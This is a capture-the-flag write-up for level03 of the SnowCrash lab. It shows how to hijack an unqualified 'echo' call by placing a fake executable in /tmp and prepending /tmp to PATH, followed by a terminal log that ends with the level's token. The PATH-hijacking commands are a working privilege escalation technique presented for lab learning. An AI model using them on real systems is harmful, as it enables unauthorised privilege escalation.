Command strings on level03 shows that the command /usr/bin/env echo "Exploit me" is run inside the program
we can take advantage of the non absolute path to run another command like getflag at the first location in the $PATH

1) add /tmp to $PATH with : $export PATH=/tmp:$PATH

2) place a fake echo containing getflag in /tmp : $echo "getflag" > /tmp/echo

3) add execution rights : $chmod +x /tmp/echo

4) execute ./level03

getflag executed from /tmp gives the flag


doc : https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469


level03@SnowCrash:~$ ./level03 
Exploit me
level03@SnowCrash:~$ strings level03 | grep Exploit
/usr/bin/env echo Exploit me
level03@SnowCrash:~$ echo "getflag"> /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp/:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ 